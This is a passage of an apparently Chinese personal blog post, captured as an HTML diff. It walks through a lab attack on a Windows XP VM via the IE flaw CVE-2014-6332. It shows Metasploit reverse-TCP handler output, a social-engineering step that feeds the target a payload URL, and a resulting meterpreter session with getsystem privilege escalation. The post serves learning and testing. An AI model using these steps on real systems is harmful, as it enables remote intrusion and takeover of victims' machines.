+</span></span><span class="line"><span class="cl">[*] Started reverse TCP handler on 192.168.101.15:4444 
+</span></span><span class="line"><span class="cl">[*] Using URL: http://192.168.101.15:9999/deCFhCIwXNHYT
+</span></span><span class="line"><span class="cl">[*] Server started.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>先把默认的 <code>Clippy image directory</code> 地址改成攻击机的地址，再把这个链接 <code>http://192.168.101.15:9999/deCFhCIwXNHYT</code> 填入 <code>Executable</code> 这一栏里面。</p>
+<p><img src="/img/2021-02-02_15-52.png" alt=""></p>
+<p>然后点击 <code>Execute</code></p>
+<p>这时，靶机就会发生一件有趣的事情</p>
+<p><img src="/img/VirtualBox_XP_02_02_2021_15_53_43.png" alt=""></p>
+<p>无论点击哪个，都会跳转到 msf 的链接。</p>
+<p>点击之后，msf 有了反应</p>
+<p><img src="/img/2021-02-02_15-55.png" alt=""></p>
+<p>一个 <code>meterpreter</code> 连接建立了</p>
+<p><img src="/img/2021-02-02_15-57.png" alt=""></p>
+<p>进入这个会话</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">sessions -i 1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/img/2021-02-02_15-59.png" alt=""></p>
+<p>这时我们就可以正常使用 <code>meterpreter</code> 操作这台靶机了..</p>
+<p><img src="/img/2021-02-02_16-00.png" alt=""></p>
+<p><code>getsystem</code> 提权也没有问题。</p>
+<p>至于 <code>meterpreter</code> 的用法就不再继续写下去了，因为之前写过（逃。</p>
+<p>然后到这里就算成功一大半了，剩下的就是后渗透，说很久都说不完呢～就到这里吧～</p>
+<h2 id="结尾">结尾</h2>
+<p>呼~ 写完了.. qwq</p>
+<p>不过要声明一下，本文内容仅限于测试学习使用，<strong>别拿去干坏事</strong>，否则后果自负哦～</p>
+<p>最后，本站遵循 <a href="https://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC 4.0 协议</a>，转载请注明出处</p>
+<hr>
+<h2 id="参考链接">参考链接</h2>
+<ul>
+<li><a href="https://cvedetails.com/cve/CVE-2014-6332/">CVE-2014-6332 : OleAut32.dll in OLE in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows</a></li>
+<li><a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/MS14-064">Microsoft Security Bulletin MS14-064 - Critical | Microsoft Docs</a></li>
+<li><a href="https://www.exploit-db.com/exploits/35229">Microsoft Internet Explorer 11 - OLE Automation Array Remote Code Execution (1) - Windows remote Exploit</a></li>
+<li><a href="https://www.exploit-db.com/exploits/35308">Microsoft Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / PowerShell VirtualAlloc (MS14-064) - Windows remote Exploit</a></li>
+<li><a href="http://securityintelligence.com/ibm-x-force-researcher-finds-significant-vulnerability-in-microsoft-windows">IBM X-Force Researcher Finds Significant Vulnerability in Microsoft Windows</a></li>
+<li><a href="https://forsec.nl/2014/11/cve-2014-6332-internet-explorer-msf-module">CVE-2014-6332: it’s raining shells | forsec</a></li>
+<li><a href="https://usstzt.site/2020/05/26/bettercap%E7%9A%84%E4%BD%BF%E7%94%A8/#&amp;gid=1&amp;pid=2">kali bettercap的使用 | UsstZt</a></li>
+<li><a href="https://blog.csdn.net/qq_33066259/article/details/80737308">Bettercap2.6与beef的使用_请你吃橘子-CSDN博客</a></li>
+<li><a href="https://www.deepl.com/translator#en/zh/This%20module%20exploits%20the%20Windows%20OLE%20Automation%20array%20vulnerability%2C%20CVE-2014-6332.%20The%20vulnerability%20is%20known%20to%20affect%20Internet%20Explorer%203.0%20until%20version%2011%20within%20Windows%2095%20up%20to%20Windows%2010%2C%20and%20no%20patch%20for%20Windows%20XP.%20However%2C%20this%20exploit%20will%20only%20target%20Windows%20XP%20and%20Windows%207%20box%20due%20to%20the%20Powershell%20limitation.%20Windows%20XP%20by%20defaults%20supports%20VBS%2C%20therefore%20it%20is%20used%20as%20the%20attack%20vector.%20On%20other%20newer%20Windows%20systems%2C%20the%20exploit%20will%20try%20using%20Powershell%20instead.">DeepL Translate</a></li>
+</ul>
+
+                    
+                    <HR width="100%" id="EOF">
+		    <p style="color:#777;"></p>
+                    
+                </div>
+            </div>
+            
+            
+            <nav class="post-pagination">
+
+                
+                <a class="newer-posts" href="http://weepingdogel.github.io/%E5%AD%A6gtk%E8%AE%B0/">
+			<br>学 GTK 记
+                </a>
+                
+                
+                
+                <a class="older-posts" href="http://weepingdogel.github.io/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3_gvfs_%E5%9C%A8_i3wm_%E4%B8%8B%E6%97%A0%E6%B3%95%E6%8C%82%E8%BD%BD%E7%9A%84%E9%97%AE%E9%A2%98/">
+			<br>如何解决 gvfs 在 i3wm 下无法挂载的问题
+                </a>
+                
+            </nav>
+            <div class="post-comment-wrapper">
+                
+
+
+
+
+
+
+
+
+
+
+            </div>
+        </div>
+    </div>
+
+
+                    </div>
+            </div><div id="single-column-footer">
+ <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a>  <a href="https://amazingrise.net">Rise</a>
+<br>
+ <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
+<br>
+
+&copy;
+	
+	2021 WeepingDogel
+	
+</div>
+            </div>
+    
+    <script src="/js/journal.js"></script>
+    </body>
+</html>
